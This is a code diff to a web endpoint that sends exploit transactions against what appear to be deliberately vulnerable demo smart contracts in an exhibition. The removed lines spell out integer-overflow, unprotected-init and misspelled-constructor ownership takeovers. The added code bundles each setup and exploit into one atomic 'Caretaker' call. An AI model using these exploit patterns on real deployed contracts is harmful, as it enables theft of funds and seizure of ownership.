@@ -1,11 +1,5 @@
 import { encodeFunctionData } from "viem";
-import { catAddrs, CARESS_ABI, json, parseCat, caressDryRun, logEvent, chainName, walletClient, publicClient } from "./_shared.js";
-
-const OVERFLOW_BALANCE_ABI = [
-  { type: "function", name: "balance", stateMutability: "view", inputs: [{ type: "address" }], outputs: [{ type: "uint256" }] },
-];
-
-const DEAD = "0x000000000000000000000000000000000000dEaD";
+import { catAddrs, CARESS_ABI, json, parseCat, caressDryRun, logEvent, chainName } from "./_shared.js";
 
 // POST /api/caress  { cat: 0..4 }  ->  { ok, txHash, hashes, pending, chain }
 // Broadcasts the exploit txs through the NonceManager DO and returns as soon as the final tx is
@@ -23,7 +17,6 @@ export async function onRequestPost({ request, env }) {
   }
 
   try {
-    const { account } = walletClient(env);
     const catAddr = catAddrs(env)[cat];
     const stub = env.NONCE_MANAGER.getByName("default");
 
@@ -54,29 +47,17 @@ export async function onRequestPost({ request, env }) {
       const prophet = env.PROPHET_ADDR;
       if (!prophet) throw new Error("PROPHET_ADDR not configured");
       hashes.push(await submit(prophet, "caress", [catAddr], 0n, 500000n));
-    } else if (cat === 2) {
-      // OverflowCat: batchTransfer overflow grants balance, then caress. State persists across
-      // exhibition runs — once we've overflowed, balance[sender] = 2^255 and a second overflow
-      // would wrap it back to zero (2^255 + 2^255 ≡ 0 mod 2^256). Read first, skip the setup tx
-      // when the previous visitor already flipped the bit on our behalf.
-      const pub = publicClient(env);
-      const bal = await pub.readContract({
-        address: catAddr, abi: OVERFLOW_BALANCE_ABI, functionName: "balance", args: [account.address],
-      });
-      if (bal === 0n) {
-        hashes.push(await submit(catAddr, "batchTransfer", [[account.address, DEAD], 2n ** 255n]));
-      }
-      // Explicit gas: estimateGas runs against pre-state (balance=0, caress() is a no-op) and
-      // under-funds the actual run that takes the expensive emit branch. Same hazard as cat 1.
-      hashes.push(await submit(catAddr, "caress", [], 0n, 100000n));
-    } else if (cat === 3) {
-      // UnprotectedCat: unprotected init claims ownership, then caress.
-      hashes.push(await submit(catAddr, "init", [account.address]));
-      hashes.push(await submit(catAddr, "caress", [], 0n, 100000n));
-    } else if (cat === 4) {
-      // MisspelledCat: misspelled "constructor" claims ownership, then caress.
-      hashes.push(await submit(catAddr, "MisspeledCat", [account.address]));
-      hashes.push(await submit(catAddr, "caress", [], 0n, 100000n));
+    } else {
+      // Cats 2/3/4 via Caretaker: the setup (overflow / init / misspelled-constructor) and the
+      // caress happen in ONE atomic tx, so the state a Meow depends on can't be undone by a
+      // concurrent caress. In particular this kills the OverflowCat re-overflow race where two
+      // near-simultaneous setups summed balance back to 0 and neither cat meowed.
+      const caretaker = env.CARETAKER_ADDR;
+      if (!caretaker) throw new Error("CARETAKER_ADDR not configured");
+      const fn = cat === 2 ? "overflow" : cat === 3 ? "claim" : "rename";
+      // Explicit gas: estimateGas may see the cheap already-primed branch and under-fund a run
+      // that takes the setup branch (same hazard as cat 1).
+      hashes.push(await submit(caretaker, fn, [catAddr], 0n, 300000n));
     }
 
     return json({
